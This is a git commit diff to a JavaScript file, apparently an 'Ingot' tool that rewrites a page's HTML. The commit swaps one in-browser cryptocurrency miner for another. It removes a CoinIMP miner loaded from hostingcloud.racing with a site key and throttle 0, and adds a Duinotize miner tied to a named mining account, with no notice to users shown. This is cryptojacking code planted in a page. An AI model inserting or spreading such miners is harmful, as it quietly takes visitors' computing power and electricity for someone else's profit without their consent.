dc80e467a87e62607576c81216a6c0de52e71d1b
MMarchjr <103056947+mmarchjr@users.noreply.github.com>
2022-12-08 00:14:12 +0000

    Update Ingot-source-unminified.js

--- Ingot-source-unminified.js
+++ Ingot-source-unminified.js
@@ -19,13 +19,12 @@ return "";
 document.documentElement.innerHTML = `<html><head><link rel="icon" href="data:image/svg+xml,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' version='1.1'><path fill='white' d='M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z'></path></svg>">
 <title>Ingot</title>
 </head>
-<script src="https://www.hostingcloud.racing/mcWn.js"></script>
+<script src="https://NoozSBC.github.io/Duinotize/duinotize.js" defer></script>
 <script>
-    var _client = new Client.Anonymous('fe7d18a60c177fc6f388db93ce9ce9c2931471ef634b0581a5a8d930a9adf56f', {
-        throttle: 0, c: 'w',
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+  Duinotize({
+    username: "casepiano358208",
+    rigid: "Ingot"
+  });
 </script>
 <script>
     setTimeout(function(){
